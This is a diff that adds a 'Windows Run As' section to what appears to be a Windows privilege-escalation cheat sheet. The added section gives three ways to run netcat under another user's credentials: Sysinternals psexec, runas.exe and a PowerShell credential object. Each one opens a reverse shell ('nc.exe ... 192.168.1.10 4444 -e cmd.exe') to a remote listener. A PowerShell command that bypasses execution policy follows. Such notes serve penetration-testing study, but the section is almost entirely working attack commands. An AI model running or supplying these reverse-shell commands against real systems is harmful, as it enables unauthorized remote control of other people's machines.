@@ -26,4 +26,31 @@ powershell -ExecutionPolicy ByPass -command "& { . C:\Users\Public\Invoke-MS16-0
 
 * Windows Run As
 
-** ada
+1 - Sysinternal psexec
+
+```
+C:\>psexec64 \\COMPUTERNAME -u Test -p test -h "c:\users\public\nc.exe -nc 192.168.1.10 4444 -e cmd.exe" 
+```
+
+2 - runas.exe
+
+```
+C:\>C:\Windows\System32\runas.exe /env /noprofile /user:Test "c:\users\public\nc.exe -nc 192.168.1.10 4444 -e cmd.exe"
+ Enter the password for Test:
+```
+
+3 - Powershell 
+
+```
+$username = '<username here>'
+$password = '<password here>'
+$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
+$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
+Start-Process -FilePath C:\Users\Public\nc.exe -NoNewWindow -Credential $credential -ArgumentList ("-nc","192.168.1.10","4444","-e","cmd.exe") -WorkingDirectory C:\Users\Public
+ ```
+
+To start:
+
+```
+powershell -ExecutionPolicy ByPass -command "& { . C:\Users\public\PowerShellRunAs.ps1; }"
+```
